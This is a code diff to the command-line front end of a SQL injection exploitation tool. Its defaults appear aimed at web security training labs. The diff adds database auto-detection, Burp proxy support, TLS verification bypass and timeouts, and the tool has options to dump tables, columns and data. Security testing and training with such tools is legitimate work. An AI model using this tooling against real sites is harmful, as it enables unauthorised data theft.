@@ -3,6 +3,7 @@ from .blindBoolean import BlindBooleanBased
 from .blindError import BlindErrorBased
 from .blindTime import BlindTimeBased
 from .unionBased import UnionBased
+from .detectDb import DbDetector
 
 TECHNIQUES = {
     "blind-error": BlindErrorBased,
@@ -28,8 +29,8 @@ def parse_args():
     parser.add_argument("--url", required=True, help="Target URL")
     parser.add_argument("--technique", "-t", required=True, choices=TECHNIQUES.keys(),
                         help="SQLi technique: blind-error, blind-boolean, blind-time, union")
-    parser.add_argument("--db", default="oracle", choices=["oracle", "mysql", "postgresql", "mssql", "sqlite", "mariadb"],
-                        help="Database type (default: oracle)")
+    parser.add_argument("--db", default="oracle", choices=["oracle", "mysql", "postgresql", "mssql", "sqlite", "mariadb", "auto"],
+                        help="Database type (default: oracle, 'auto' to detect)")
     parser.add_argument("--inject", default="cookie", choices=["cookie", "url_param", "post", "header"],
                         help="Injection point location (default: cookie)")
     parser.add_argument("--param", default="TrackingId", help="Injectable parameter name (default: TrackingId)")
@@ -39,6 +40,9 @@ def parse_args():
     parser.add_argument("--session", help="Extra session cookie value")
     parser.add_argument("--signal", default="Welcome back!", help="Boolean signal text (default: 'Welcome back!')")
     parser.add_argument("--delay", type=int, default=5, help="Time delay in seconds for time-based (default: 5)")
+    parser.add_argument("--proxy", help="Proxy URL (e.g. http://127.0.0.1:8080 for Burp)")
+    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
+    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
     parser.add_argument("--dump-tables", action="store_true", help="Dump table names (union only)")
     parser.add_argument("--dump-columns", help="Dump columns for a table (union only)")
     parser.add_argument("--dump-data", nargs="+", help="Dump data: --dump-data TABLE col1 col2 (union only)")
@@ -55,12 +59,35 @@ def main():
 
     technique_class = TECHNIQUES[args.technique]
 
+    if args.proxy and not args.no_verify:
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        args.no_verify = True
+
+    if args.db == "auto":
+        detector = DbDetector(
+            url=args.url,
+            inject_point=inject_point,
+            extra_cookies=extra_cookies,
+            proxy=args.proxy,
+            verify=not args.no_verify,
+        )
+        detected = detector.detect()
+        if not detected:
+            print("[-] Auto-detect failed. Use --db to specify manually.")
+            return
+        args.db = detected
+        print(f"[+] Using detected database: {args.db}\n")
+
     kwargs = {
         "url": args.url,
         "inject_point": inject_point,
         "targetTable": args.table,
         "db_type": args.db,
-        "extra_cookies": extra_cookies
+        "extra_cookies": extra_cookies,
+        "proxy": args.proxy,
+        "verify": not args.no_verify,
+        "timeout": args.timeout,
     }
 
     if args.technique == "blind-boolean":
@@ -75,6 +102,8 @@ def main():
     print(f"[*] Database: {args.db}")
     print(f"[*] Inject: {args.inject} → {args.param}")
     print(f"[*] Table: {args.table}")
+    if args.proxy:
+        print(f"[*] Proxy: {args.proxy}")
     print()
 
     if args.technique == "union":
